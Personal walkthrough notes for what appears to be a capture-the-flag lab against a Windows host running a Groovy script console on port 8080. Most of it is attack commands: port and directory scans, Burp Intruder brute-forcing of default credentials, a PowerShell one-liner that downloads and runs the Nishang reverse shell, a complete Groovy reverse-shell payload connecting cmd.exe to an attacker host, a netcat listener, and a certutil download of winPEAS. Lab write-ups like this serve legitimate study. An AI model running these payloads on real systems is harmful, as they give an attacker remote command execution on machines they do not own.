
```python
export TARGET_IP=10.10.169.220
export TARGET_MAC=
export TARGET_NETWORK=
```

Doesnt respond to pings
```python
sudo nmap -Pn -p- -v -A -T4 $TARGET_IP
```


```python
sudo nmap $TARGET_IP -sUV --top-ports 10
```


```python
http://10.10.169.220
```

![[Pasted image 20250127142719.png]]

```python
http://10.10.169.220:8080
```
![[Pasted image 20250127142749.png]]


Gobuster while i work
```python
gobuster dir -u http://10.10.169.220:8080 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -v
```
`Nothing helpful`

**Using the provided command to gain a foothold**
`https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1`

put payload in pythonserver
```python
python3 -m http.server 8000
```

```python
powershell iex (New-Object Net.WebClient).DownloadString('http://10.6.46.238:4444/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress 10.6.46.238 -Port 4444
```

```python
burpesuite
```

Used intruder with usernames and passwords that are common 

admin:admin
worked
logged in
went to Groovy script console
used but wait to hit run until listener is up

https://gist.github.com/frohoff/fed1ffaab9b9beeb1c76
```python
String host="192.168.254.132";
int port=1234;
String cmd="cmd.exe";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
```


```python
nc -lvnp 4444
```

hit run on  groovy

now i have a shell   

on my kali with winpeas
```python
python3 -m http.server
```

cd to \Temp

pull down winPEAS from my python server
```powershell
certutil -urlcache -split -f "http://192.168.254.132:8000/winPEASx86.exe" winPEASx86.exe
```

run it
```python
.\winPEASx86.exe
```
